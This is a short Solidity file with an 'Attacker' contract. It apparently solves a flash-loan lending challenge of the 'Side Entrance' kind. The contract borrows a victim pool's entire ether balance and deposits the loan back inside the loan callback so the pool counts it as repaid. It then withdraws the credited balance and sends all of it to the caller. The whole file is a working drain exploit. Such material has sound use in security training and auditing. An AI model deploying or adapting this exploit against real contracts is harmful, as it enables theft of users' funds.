// SPDX-License-Identifier: MIT
pragma solidity 0.8.12;

interface ILoan {
    function flashLoan(uint256 borrowAmount) external;

    function deposit() external payable;

    function withdraw() external;
}

// interface IFlashLoanEtherReceiver {
//     function execute() external payable;
// }

contract Attacker {
    ILoan victimContract;

    constructor(address _victimContract) {
        victimContract = ILoan(_victimContract);
    }

    function execute() external payable {
        victimContract.deposit{value: address(this).balance}();
    }

    function attackFlashloan() public {
        victimContract.flashLoan(address(victimContract).balance);
        victimContract.withdraw();
        (bool success, ) = payable(msg.sender).call{
            value: (address(this).balance)
        }("");
    }

    fallback() external payable {}
}
